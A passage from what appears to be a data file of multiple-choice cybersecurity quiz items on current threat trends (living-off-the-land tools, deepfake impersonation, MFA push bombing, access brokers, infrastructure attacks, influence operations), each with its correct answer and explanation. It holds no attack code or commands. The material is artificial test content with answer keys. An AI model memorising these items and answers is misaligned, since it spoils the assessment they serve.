          "Living-off-the-land (LOtL) techniques use built-in operating system tools and trusted applications for malicious activities. Since these tools are legitimate and already present on the system, their use is less likely to trigger security alerts. LOLBins (Living-Off-the-Land Binaries) is a catalog of such tools.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Deepfakes in cybersecurity",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "How are deepfakes being used as a cybersecurity threat?",
        choices: [
          "To impersonate executives via fake audio or video to authorize fraudulent transactions or manipulate trust",
          "To improve the resolution of security camera footage",
          "To encrypt communications between two parties",
          "To automatically generate security patches for vulnerabilities",
        ],
        correctAnswer:
          "To impersonate executives via fake audio or video to authorize fraudulent transactions or manipulate trust",
        explanation:
          "Deepfakes use AI to create realistic synthetic audio or video of specific individuals. Attackers have used deepfake audio to impersonate CEOs in phone calls, directing employees to wire large sums. As the technology improves, deepfakes pose increasing risks to identity verification and trust.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "MFA bypass techniques",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which technique do attackers use to bypass multi-factor authentication by bombarding a user with push notifications until they approve one?",
        choices: [
          "MFA fatigue (push bombing)",
          "SQL injection",
          "ARP spoofing",
          "DNS tunneling",
        ],
        correctAnswer: "MFA fatigue (push bombing)",
        explanation:
          "MFA fatigue (push bombing) involves repeatedly sending authentication push notifications to a user's device, hoping they will eventually approve one out of frustration or confusion. Countermeasures include number matching (requiring users to enter a displayed number) and rate limiting push requests.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Initial access brokers",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What role do Initial Access Brokers (IABs) play in the cybercrime ecosystem?",
        choices: [
          "They sell unauthorized access to compromised networks to other threat actors such as ransomware gangs",
          "They provide legitimate penetration testing services to enterprises",
          "They develop antivirus software for consumer markets",
          "They manage bug bounty programs for technology companies",
        ],
        correctAnswer:
          "They sell unauthorized access to compromised networks to other threat actors such as ransomware gangs",
        explanation:
          "Initial Access Brokers specialize in gaining initial footholds in target networks and then selling that access on underground forums. Ransomware operators and other threat actors purchase this access to skip the initial compromise phase, accelerating their operations and enabling specialization in the cybercrime supply chain.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Attacks on critical infrastructure",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Why are cyberattacks against critical infrastructure (power grids, water treatment, hospitals) considered especially dangerous?",
        choices: [
          "Because disruption of these systems can directly threaten human safety and cause widespread societal harm",
          "Because critical infrastructure always uses the latest security technology",
          "Because critical infrastructure systems are never connected to the internet",
          "Because these attacks only affect government agencies, not the general public",
        ],
        correctAnswer:
          "Because disruption of these systems can directly threaten human safety and cause widespread societal harm",
        explanation:
          "Critical infrastructure systems underpin essential services like electricity, water, healthcare, and transportation. Cyberattacks on these systems can have kinetic, real-world consequences — from hospital disruptions that endanger patients to power grid outages affecting millions. The Colonial Pipeline and Ukrainian power grid attacks demonstrated these risks.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Information operations and disinformation",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "How do information operations (influence operations) relate to cybersecurity?",
        choices: [
          "Threat actors use compromised accounts, botnets, and fake personas to spread disinformation and manipulate public opinion",
          "Information operations refer exclusively to internal corporate communications",
          "Information operations are a type of DDoS attack against news websites",
          "Information operations only affect social media companies, not other organizations",
        ],
        correctAnswer:
          "Threat actors use compromised accounts, botnets, and fake personas to spread disinformation and manipulate public opinion",
        explanation:
          "Information operations combine cyber capabilities (hacking, social media manipulation) with disinformation campaigns to influence public discourse, undermine trust, or achieve geopolitical objectives. Nation-state actors frequently use hack-and-leak operations, troll farms, and bot networks as part of broader information warfare strategies.",
      },
    ],
  },
];
